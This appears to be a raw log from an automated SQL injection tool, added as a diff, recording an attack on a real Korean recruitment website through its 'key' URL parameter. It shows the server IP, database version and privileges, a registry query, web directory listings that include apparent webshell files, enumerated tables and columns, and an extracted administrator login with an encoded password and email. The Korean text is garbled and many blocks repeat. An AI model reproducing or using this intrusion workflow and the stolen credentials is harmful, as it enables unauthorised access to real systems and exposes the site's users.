@@ -1,0 +1,1127 @@
+■漏洞信息:============================================================
+ ·URL:http://www.tradein.co.kr/adopt/adopt_detail.asp?key=123452
+ ·页面标题：[公开拱幅秒诀][(林)坷配溃][秦寇康诀焊炼(康绢-捞皋老/皋脚历) 棺 荤公盔(哪腔磐-器配/巩辑累己)][~2011-03-22]
+ ·参数:key=123452
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.219.173.216
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 08:17:35 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQQDRRCRD=GGJBMDGAOEJCENMBCNKNELOG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：Tradein_2006
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVR034327
+- 服务名：MSSQLSERVER
+- 系统用户名：Tradein_sql
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 1
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	d:\Tradein_SQL\MSSQL\data\master.mdf	
+model	d:\Tradein_SQL\MSSQL\data\model.mdf	
+msdb	d:\Tradein_SQL\MSSQL\data\msdbdata.mdf	
+Northwind	d:\Tradein_SQL\MSSQL\data\northwnd.mdf	
+price_backup	d:\Tradein_SQL\MSSQL\data\price_backup_Data.MDF	
+pubs	d:\Tradein_SQL\MSSQL\data\pubs.mdf	
+tempdb	d:\Tradein_SQL\MSSQL\data\tempdb.mdf	
+Tradein_2006	D:\Tradein_SQL\MSSQL\Data\Tradein_2006.mdf	
+tradein_2006_test	d:\Program Files\Microsoft SQL Server\MSSQL\data\tradein_2006_test_Data.MDF	
+view_轰绢	D:\Tradein_SQL\MSSQL\Data\view_轰绢.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	TRADEIN	2188	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	TRADEIN	2188	AWAITING COMMAND	SYSTEM	
+MS SQLEM - Data Tools	sleeping	TRADEIN	5916	AWAITING COMMAND	hmaster	
+MS SQLEM	sleeping	TRADEIN	2336	AWAITING COMMAND	hmaster	
+MS SQLEM	sleeping	TRADEIN	2336	AWAITING COMMAND	hmaster	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SVR034327	SQL Server	SQLOLEDB	SVR034327		SVR034327	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+Dir of D:: 
+
+data\
+dextupload20\
+i386\
+Program Files\
+RECYCLER\
+System Volume Information\
+Tradein_LOG\
+Tradein_SQL\
+Tradein_WWW\
+data.bak
+dextupload20.zip
+email_question.asp[2010-10-14]
+fo-sar56.exe
+PHP_Setup_for_IIS_2009041300.exe
+TYARPv3.com
+
+Dir of D:\Tradein_WWW: 
+
+归诀 2010-10-18\
+辑滚捞傈\
+ds\
+stop_service\
+www_2006 (2010-04-12 归诀)\
+www_2006_2\
+www_2006_弥辟\
+www_2006_HTML\
+www_2006_HTML2\
+www_2006_origin\
+www_2006_test (2010-08-10)\
+www_2006\
+haclin.asp
+haclin1.asp
+haclin3.asp
+hostcenter.htm
+i.asp
+qqasp
+ri.asp
+webs.asp
+wl.asp
+www_2006.zip
+xixi.asp
+yeara.asp
+
+Dir of D:\Tradein_WWW\www_2006: 
+一次性获取失败，正在批次获取……
+
+_Lib\
+_MailData\
+2006board\
+20100903\
+2010mcu\
+about\
+admin\
+adopt\
+alba\
+apply\
+board\
+common\
+community2011\
+company\
+css\
+cu_pop\
+customer\
+dispatch\
+edu\
+education\
+etradein\
+event\
+FileUpload\
+head\
+headpatch\
+ibsa_tmp_upload\
+images\
+img\
+imsi\
+include\
+incruit\
+job\
+join\
+js\
+mail_tmp_upload\
+mailing2\
+mailling\
+matchinfo\
+matchinfo2\
+member\
+module\
+myWorld\
+newsletter\
+newyear_pop\
+NFUpload\
+Pay_Mode\
+person_tmp_upload\
+person\
+poll\
+pop\
+qlog\
+recruiter\
+scripts\
+scroll\
+search\
+sendmail\
+sms_module\
+temp\
+trade\
+w3c\
+yang_test\
+yang_test1\
+_adopt_auto_del.asp
+_news_rss.asp
+0816_index.asp
+1.asp
+1234.asp
+2.asp
+2006_adopt_rolling.asp
+2006_head_rolling.asp
+2006_head_rolling[2006.11.04].asp
+2006_picture.html
+2006career.asp
+2006choice.asp
+2006copyright.asp
+2006foot_banner.asp
+2006knowhow.asp
+2006kyung.asp
+2006m_apply.asp
+2006m_banner.asp
+2006m_banner2.asp
+2006m_company.asp
+2006m_gen.asp
+2006m_gen1.asp
+2006m_gen2.asp
+2006m_goldbanner.asp
+2006m_goldbanner1.asp
+2006m_grand.asp
+2006m_hot.asp
+2006m_hot1.asp
+2006m_hot2.asp
+2006m_leftspecial.asp
+2006m_pro.asp
+2006premium.asp
+2006premium_test.asp
+2006premium1.asp
+2006premium2.asp
+2006premium3.asp
+2006premium4.asp
+2006premium5.asp
+2006prize.asp
+2006r_notice.asp
+2006r_notice_2008-05-15_傍瘤焊档归诀.asp
+2006r_notice2.asp
+2006r_notice2_0423.asp
+2006regular.asp
+2006regular2.asp
+2006rss.asp
+2006salary.asp
+2006sinib.asp
+2006sitemap.asp
+2006today_apply.asp
+2006trade_took.asp
+2006tradein.asp
+2006tradein_search.asp
+2006tradein_search_appli.asp
+2006tradein_search_appli_ok.asp
+2006tradein_search_index.asp
+2006tradein_search_index1.asp
+2006tradein1.asp
+2006tradein2.asp
+2006tradein3.asp
+2007employment_talk.asp
+2007m_apply.asp
+2007m_gen.asp
+2007trade_english.asp
+2007world_controller.asp
+20100903_a.html
+2010foot_banner.asp
+2010m_banner2.asp
+2010m_banner2_1.asp
+2010m_bronze_banner.asp
+2010m_goldbanner.asp
+2010m_goldbanner_t.asp
+2010m_hot_banner.asp
+2010m_silver_banner.asp
+2010m_special_banner.asp
+2010prize.asp
+3.asp
+911.asp
+911.zip
+9111.asp
+91111.asp
+滴魂浚柳惑窜.jpg
+aaa.asp
+aaaa.asp
+ad_all_banner.asp
+adopt_rbanner.asp
+ajax_del.asp
+ajax_secure.asp
+all_map.html
+all_map_old.html
+apply_scroll.asp
+apply_scroll.htm
+as.asp
+bottom_job.html
+bottom1.html
+check_read.asp
+cippo.asp
+cippo1.asp
+company01.html
+company02.html
+crossdomain.xml
+dbmove_career.asp
+dbmove_expert.asp
+dbmove_salary.asp
+emailno.html
+forgoogle.asp
+fucker.asp
+fucker.aspx
+fx.asp
+graph.asp
+inchul_pop01.html
+index.20110320.asp
+index.asp
+index[2007.06.01].asp
+index[傍荤吝牢郸胶200806].asp
+index[扁粮 牢郸胶].asp
+index_01.asp
+index_1.asp
+index_1011.asp
+index_20060410_厚惑其捞瘤.asp
+index_2007.asp
+index_2007-11-14.asp
+index_20071121.asp
+index_aji.asp
+index_hing.asp
+index_new.asp
+index_old.asp
+index_old070719.asp
+index_renew.asp
+index_simple_server.asp
+index_t.asp
+index_test.asp
+index01.asp
+index02.asp
+index02_0415.asp
+index02_0422.asp
+index1.asp
+index1222.asp
+index2.asp
+index20061024.asp
+index20070402.asp
+index20071127.asp
+index3.asp
+indexQorQor.asp
+info_list.asp
+info_list2.asp
+job_network.html
+join.html
+left.asp
+left_old.asp
+loginbanner.asp
+m_alba.asp
+m_apply.asp
+m_apply_old.asp
+m_banner.asp
+m_banner_old.asp
+m_banner2.asp
+m_bottombanner.asp
+m_com.asp
+m_company_ad.asp
+m_company_ad_old.asp
+m_eduinfo.htm
+m_etradein.asp
+m_expert.asp
+m_gen.asp
+m_gen_old.asp
+m_goldbanner.asp
+m_goldbanner_old.asp
+m_grand.asp
+m_grand_old.asp
+m_head.asp
+m_head_old.asp
+m_head2.asp
+m_hot.asp
+m_hot_old.asp
+m_infoman.asp
+m_job_top5.asp
+m_leftspecial.asp
+m_news2.asp
+m_poll.asp
+m_poll_ok.asp
+m_prize.htm
+m_pro.asp
+m_pro_.asp
+m_rightspecial.asp
+m_rightspecial_old.asp
+m_top5.asp
+m_topbanner.asp
+m_toprightbanner.asp
+m_trade.asp
+main.asp
+main.jpg
+main_poll.asp
+mms00.asp
+my_world.asp
+my201.asp
+nation.fla
+nation.swf
+nation2.swf
+phpinfo.php
+pop.asp
+pop.html
+pop081103.html
+popup.html
+popup-banner.asp
+popup-banner.asp[2010-11-17]
+popup-banner.asp[2010-12-07]
+pram.asp
+pre.asp
+pre_old070719.asp
+product.asp
+quick.asp
+r_notice.asp
+renew_index.asp
+ri.asp
+right_banner.asp
+scroll.asp
+scroll2.asp
+scroll3.asp
+scroll4.asp
+
+
+■数据库信息:============================================================
+- 数据库名：Tradein_2006
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVR034327
+- 服务名：MSSQLSERVER
+- 系统用户名：Tradein_sql
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 1
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+griggs	d:\Program Files\Microsoft SQL Server\MSSQL\data\griggs_Data.MDF	
+griggsdb	d:\Program Files\Microsoft SQL Server\MSSQL\data\griggsdb_Data.MDF	
+master	d:\Tradein_SQL\MSSQL\data\master.mdf	
+model	d:\Tradein_SQL\MSSQL\data\model.mdf	
+msdb	d:\Tradein_SQL\MSSQL\data\msdbdata.mdf	
+Northwind	d:\Tradein_SQL\MSSQL\data\northwnd.mdf	
+price_backup	d:\Tradein_SQL\MSSQL\data\price_backup_Data.MDF	
+pubs	d:\Tradein_SQL\MSSQL\data\pubs.mdf	
+tempdb	d:\Tradein_SQL\MSSQL\data\tempdb.mdf	
+Tradein_2006	D:\Tradein_SQL\MSSQL\Data\Tradein_2006.mdf	
+tradein_2006_test	d:\Program Files\Microsoft SQL Server\MSSQL\data\tradein_2006_test_Data.MDF	
+view_轰绢	D:\Tradein_SQL\MSSQL\Data\view_轰绢.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	TRADEIN	2188	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	TRADEIN	2188	AWAITING COMMAND	SYSTEM	
+Microsoft SQL Server Management Studio	sleeping	146176F0A4A947A	1888	AWAITING COMMAND		
+Internet Information Services	sleeping	TRADEIN	8024	AWAITING COMMAND		
+Internet Information Services	sleeping	TRADEIN	8024	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SVR034327	SQL Server	SQLOLEDB	SVR034327		SVR034327	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [Tradein_2006] 的表名……
+一次性获取失败，正在批次获取……
+ _board_$admin_
+_board_career
+edu_email
+newcomment
+asdf_Tmp
+_board_div_career
+edu_online
+SQL_Dir
+_board_div_eventi
+SQL_Path
+t_jobstudy
+_board_div_salary
+newcho
+_board_div_tinfo
+t_valuation_a
+_board_div_tradediary
+t_valuation_b
+_board_eventi
+trade_regist
+board_79
+service_head
+D99_CMD
+_board_salary
+member_edu
+_board_tinfo
+board_80
+category
+_board_tradediary
+_members_
+inno_admin
+eventuse
+myWorld_content
+board_11
+service_dispatch
+service_adopt
+ahcmd
+member_hunter
+board_12
+test_1
+board_13
+member_com
+t_member_com
+company_m_use
+board_14
+sysc
+board_15
+t_member_head
+temp_member_edu
+board_16
+board_17
+members
+board_18
+board_recommand
+board_19
+book_comment
+board_2
+book_recommand
+customer
+board_20
+member_head
+board_21
+D99_REG
+etradein
+info_answer
+board_22
+cnt_log
+expert_comment
+member_leave_Tbl
+board_23
+TB_JC_NOTICE
+expert_qna_2
+propose
+expert_recommand
+board_24
+expert_register
+temp_service_edu
+t_comment
+info_act
+scrap
+board_40
+info_comment
+info_member
+TB_JC_NOTICE_COMMENT
+info_point
+board_41
+info_question
+info_recommand
+temp
+D99_Tmp
+board_42
+inno_1
+t_t
+t_orderproduct
+TB_JC_MEM_PROC
+mailling_send_list
+board_43
+inno_notice
+board_44
+join_adopt_info
+support_pe_com
+TB_JC_COMMENT
+join_com_id
+board_45
+keyword
+TB_JC_CATEGORY
+board_46
+comd_list
+mail_temp
+board_47
+taboo_company
+TB_JC_BOARD_FILE
+mail_transfer
+email_question
+match_apply
+TB_JC_BOARD
+board_51
+company_count
+count_scrap
+match_person
+service_apply
+support_sms_list
+board_52
+t_sms
+member_dispatch
+board_53
+cmd
+board_60
+temp_member_com
+t_jiaozhu
+temp_service_adopt
+board_54
+board_61
+payopen
+board_55
+board_62
+temp_service_apply
+temp_member_person
+money
+TB_JC_CONTENT
+board_57
+ksilbo_maraton
+board_63
+money_add
+poll2
+board_7
+board_64
+temp_service_head
+board_8
+temp_service_dispatch
+order_add
+test2
+board_9
+board_65
+order_goldbanner
+test3
+inno_comment
+t_main_view
+test
+board_66
+temp_member_head
+orderproduct
+temp_member_dispatch
+poll
+board_67
+member_count
+poll_admin
+email
+service_edu
+cippo_count
+poll_answer
+expert_qna
+poll_category
+jiji_Tmp
+mail
+poll_comment
+bank
+meeting
+poll_id
+online
+poll_statics
+support_com_pe
+school
+service_adopt_daum
+service_adopt_焊包
+price
+dtproperties
+mail_config
+zz_Tmp
+statistic
+subway
+t_admin_main_view
+board_68
+t_nation_code
+zd_Tmp
+jiaozhu
+board_69
+mailling_receipt_check
+board_70
+orderlist
+member_person
+board_71
+temp_service_alba
+ff_Tmp
+zipcode
+t_take_interview
+tradein_search
+webzine_comment
+shit_tmp
+sdf_Tmp
+board_10
+no_count
+area
+t_take_say_company
+banner
+event_recruiter_view
+board_81
+t
+board_72
+BCS_code
+mileage_list
+Total_search_content
+BCS_data
+Total_search_word_list
+board_73
+BCS_item
+BCS_nation
+syscommand
+t_sub_view
+newboard
+mileage
+
+------------------------------------------------------------
+正在获取 [Tradein_2006].[edu_email] 的列名……
+ idx
+id
+from_num
+to_num
+title
+content
+insertday
+reply
+name
+email
+
+正在执行查询：select top 3 idx,id,name,email from Tradein_2006..edu_email order by id
+------------------------------------------------------------
+正在获取 [Tradein_2006].[_members_] 的列名……
+ idx
+mem_id
+mem_passwd
+mem_level
+mem_name
+mem_idsn
+mem_email
+mem_homepage
+mem_zipcode
+mem_addr1
+mem_addr2
+mem_telnum
+mem_hpnum
+mem_job
+mem_part
+mem_grade
+mem_mailing
+mem_ip
+mem_regdate
+mem_editdate
+mem_lastdate
+public_id
+public_name
+public_email
+public_homepage
+public_addr
+public_telnum
+public_hpnum
+public_job
+public_part
+public_memo
+public_regdate
+mem_memo
+
+正在执行查询：select top 3 mem_id,mem_passwd,mem_name,mem_email from Tradein_2006.._members_ order by mem_email
+tradein	dWZhNW5kMTE	包府磊	master@tradein.co.kr	
+正在执行查询：select top 10 mem_id,mem_passwd,mem_name,mem_email from Tradein_2006.._members_ order by mem_email
+tradein	dWZhNW5kMTE	包府磊	master@tradein.co.kr	
+------------------------------------------------------------
+正在获取数据库 [price_backup] 的表名……
+ price_new
+dtproperties
+
+------------------------------------------------------------
+正在获取数据库 [view_轰绢] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+取记录数失败，使用设定值：5
+
+
+
+
+
+------------------------------------------------------------
+正在获取数据库 [griggsdb] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+取记录数失败，使用设定值：5
+
+
+
+
+
+
+■数据库信息:============================================================
+- 数据库名：Tradein_2006
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVR034327
+- 服务名：MSSQLSERVER
+- 系统用户名：Tradein_sql
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 1
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+griggs	d:\Program Files\Microsoft SQL Server\MSSQL\data\griggs_Data.MDF	
+
+■数据库信息:============================================================
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+■数据库信息:============================================================
+- 数据库名：Tradein_2006
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVR034327
+- 服务名：MSSQLSERVER
+- 系统用户名：Tradein_sql
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 1
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+griggs	d:\Program Files\Microsoft SQL Server\MSSQL\data\griggs_Data.MDF	
+griggsdb	d:\Program Files\Microsoft SQL Server\MSSQL\data\griggsdb_Data.MDF	
+master	d:\Tradein_SQL\MSSQL\data\master.mdf	
+model	d:\Tradein_SQL\MSSQL\data\model.mdf	
+msdb	d:\Tradein_SQL\MSSQL\data\msdbdata.mdf	
+Northwind	d:\Tradein_SQL\MSSQL\data\northwnd.mdf	
+price_backup	d:\Tradein_SQL\MSSQL\data\price_backup_Data.MDF	
+pubs	d:\Tradein_SQL\MSSQL\data\pubs.mdf	
+tempdb	d:\Tradein_SQL\MSSQL\data\tempdb.mdf	
+Tradein_2006	D:\Tradein_SQL\MSSQL\Data\Tradein_2006.mdf	
+tradein_2006_test	d:\Program Files\Microsoft SQL Server\MSSQL\data\tradein_2006_test_Data.MDF	
+view_轰绢	D:\Tradein_SQL\MSSQL\Data\view_轰绢.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	TRADEIN	2188	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	TRADEIN	2188	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	TRADEIN	4528	AWAITING COMMAND		
+Internet Information Services	sleeping	TRADEIN	4528	AWAITING COMMAND		
+Internet Information Services	sleeping	TRADEIN	4528	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SVR034327	SQL Server	SQLOLEDB	SVR034327		SVR034327	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [Tradein_2006] 的表名……
+一次性获取失败，正在批次获取……
+ _board_$admin_
+_board_career
+edu_email
+newcomment
+asdf_Tmp
+_board_div_career
+edu_online
+SQL_Dir
+_board_div_eventi
+SQL_Path
+t_jobstudy
+_board_div_salary
+newcho
+_board_div_tinfo
+t_valuation_a
+_board_div_tradediary
+t_valuation_b
+_board_eventi
+trade_regist
+board_79
+service_head
+_board_salary
+member_edu
+_board_tinfo
+board_80
+category
+_board_tradediary
+_members_
+inno_admin
+eventuse
+myWorld_content
+board_11
+service_dispatch
+service_adopt
+ahcmd
+member_hunter
+board_12
+test_1
+board_13
+member_com
+t_member_com
+company_m_use
+board_14
+sysc
+board_15
+t_member_head
+temp_member_edu
+board_16
+board_17
+members
+board_18
+board_recommand
+board_19
+book_comment
+board_2
+book_recommand
+customer
+board_20
+member_head
+board_21
+D99_REG
+etradein
+info_answer
+board_22
+cnt_log
+expert_comment
+member_leave_Tbl
+board_23
+TB_JC_NOTICE
+expert_qna_2
+propose
+expert_recommand
+board_24
+expert_register
+temp_service_edu
+t_comment
+info_act
+scrap
+board_40
+info_comment
+info_member
+TB_JC_NOTICE_COMMENT
+info_point
+board_41
+info_question
+info_recommand
+temp
+board_42
+inno_1
+t_orderproduct
+TB_JC_MEM_PROC
+mailling_send_list
+board_43
+inno_notice
+board_44
+join_adopt_info
+support_pe_com
+TB_JC_COMMENT
+join_com_id
+board_45
+keyword
+TB_JC_CATEGORY
+board_46
+comd_list
+mail_temp
+board_47
+taboo_company
+TB_JC_BOARD_FILE
+mail_transfer
+email_question
+match_apply
+TB_JC_BOARD
+board_51
+company_count
+count_scrap
+match_person
+service_apply
+support_sms_list
+board_52
+t_sms
+member_dispatch
+board_53
+cmd
+board_60
+temp_member_com
+t_jiaozhu
+temp_service_adopt
+board_54
+board_61
+payopen
+board_55
+board_62
+temp_service_apply
+temp_member_person
+money
+TB_JC_CONTENT
+board_57
+ksilbo_maraton
+board_63
+money_add
+poll2
+board_7
+board_64
+temp_service_head
+board_8
+temp_service_dispatch
+order_add
+test2
+board_9
+board_65
+order_goldbanner
+test3
+inno_comment
+t_main_view
+test
+board_66
+temp_member_head
+orderproduct
+temp_member_dispatch
+poll
+board_67
+member_count
+poll_admin
+email
+service_edu
+cippo_count
+poll_answer
+expert_qna
+poll_category
+jiji_Tmp
+mail
+poll_comment
+bank
+meeting
+poll_id
+online
+poll_statics
+support_com_pe
+school
+service_adopt_daum
+service_adopt_焊包
+price
+dtproperties
+mail_config
+zz_Tmp
+statistic
+subway
+t_admin_main_view
+D99_CMD
+board_68
+t_nation_code
+zd_Tmp
+jiaozhu
+board_69
+mailling_receipt_check
+board_70
+orderlist
+member_person
+board_71
+temp_service_alba
+ff_Tmp
+zipcode
+t_take_interview
+tradein_search
+D99_Tmp
+webzine_comment
+shit_tmp
+sdf_Tmp
+board_10
+no_count
+t_t
+area
+t_take_say_company
+banner
+event_recruiter_view
+board_81
+t
+board_72
+BCS_code
+mileage_list
+Total_search_content
+BCS_data
+Total_search_word_list
+board_73
+BCS_item
+BCS_nation
+syscommand
+t_sub_view
+newboard
+mileage
+
